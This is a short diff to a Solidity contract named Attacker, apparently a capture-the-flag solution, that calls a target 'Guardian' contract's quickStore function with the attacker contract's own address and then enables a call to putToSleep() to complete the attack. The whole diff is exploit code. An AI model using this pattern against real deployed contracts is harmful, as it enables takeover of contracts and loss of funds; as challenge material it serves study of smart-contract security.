@@ -15,12 +15,12 @@ contract Attacker {
         require(msg.value == 1337, "Incorrect eth value sent");
 
         // Encode the function call to quickStore
-        bytes memory data = abi.encodeWithSignature("quickStore(uint8,uint256)", 0, address(msg.sender));
+        bytes memory data = abi.encodeWithSignature("quickStore(uint8,uint256)", 0, address(this));
 
         // Call the Guardian contract with the encoded data
         (bool success, ) = address(SETUP.TARGET()).call{value: msg.value}(data);
         require(success, "Call to Guardian failed");
 
-        //SETUP.TARGET().putToSleep();
+        SETUP.TARGET().putToSleep();
     }
 }
